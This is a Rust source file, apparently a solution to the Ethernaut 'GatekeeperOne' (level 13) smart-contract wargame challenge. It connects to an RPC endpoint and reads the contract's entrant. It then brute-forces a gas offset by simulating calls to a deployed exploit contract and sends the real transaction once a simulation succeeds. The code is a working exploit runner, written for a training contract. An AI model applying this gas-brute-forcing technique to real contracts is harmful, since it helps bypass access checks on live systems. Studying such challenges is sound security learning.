#[allow(unused_imports)]
use alloy::{
    network::{EthereumWallet, TransactionBuilder},
    primitives::{
        Bytes, U256, address, Address,
        utils::{Unit, format_ether},
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol!{
    #[sol(rpc)]
    contract GatekeeperOne {
        function entrant() external view returns (address);
        function enter(bytes8 _gateKey) public returns(bool);
    }

    #[sol(rpc)]
    contract Exp {
        function exploit(address target, uint gas_offset) external returns (bool);
    }
}

use crate::ethernaut;
use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level13_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level13())?;

    Ok(())
}

async fn level13() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);

    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;

    let gatekeeper_address = "0x1665f8307eB7387cd2848E2F7461D4F6E6b81d2a".parse()?;
    let gatekeeper = GatekeeperOne::new(
        gatekeeper_address,
        provider.clone()
    );
    let exp_address = "0x84D2b48cF2eBfC87a0e58342a946d571EEAf109C".parse()?;
    let exp = Exp::new(exp_address, provider.clone());

    println!("[CHECK]");
    let entrant = gatekeeper.entrant().call().await?;
    println!("[GatekeeperOne.entrant()]    entrant = {}\n", entrant);
    

    for i in 6300..8191 {
        let success = exp.exploit(
            gatekeeper_address,
            U256::from(i)
        )
            .gas(3100000)
            .call()
            .await?;

        if success {
            println!("[test]    i = {i}\n");
            
            let exploit_tx = exp.exploit(
                gatekeeper_address,
                U256::from(i)
            )
                .gas(3100000)
                .send()
                .await?;
            println!("[Exp.exploit()]    Panding transaction... {}", exploit_tx.tx_hash());

            let exploit_receipt = exploit_tx.get_receipt().await?;
            println!(
                "[Exp.exploit()]    transaction included in block {}",
                exploit_receipt.block_number.expect("Failed to get block nubmer")
            );
    
            break;
        } else {
            println!("[test]    Failed({i})");
        }
    }
    
    Ok(())
}

